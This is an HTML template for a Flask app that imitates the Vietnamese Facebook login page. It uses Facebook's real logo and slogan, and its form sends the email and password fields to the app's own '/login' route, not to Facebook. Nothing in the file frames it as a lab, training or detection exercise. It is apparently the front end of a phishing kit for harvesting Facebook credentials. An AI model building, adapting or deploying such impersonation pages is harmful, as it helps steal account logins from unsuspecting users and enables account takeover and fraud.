<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Facebook</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="container">
        <div class="left-side">
            <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook logo">
            <h2>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
        </div>
        <div class="right-side">
            <div class="login-form">
                <form action="/login" method="post">
                    <input type="text" name="email" placeholder="Email hoặc số điện thoại" required>
                    <input type="password" name="pass" placeholder="Mật khẩu" required>
                    <button type="submit" class="login-button">Đăng nhập</button>
                    <a href="#" class="forgot-password">Quên mật khẩu?</a>
                    <hr>
                    <button type="button" class="create-account-button">Tạo tài khoản mới</button>
                </form>
            </div>
            <p class="create-page"><a href="#"><b>Tạo Trang</b></a> cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.</p>
        </div>
    </div>
    <footer class="page-footer">
        <!-- Add footer links here if needed -->
    </footer>
</body>
</html>
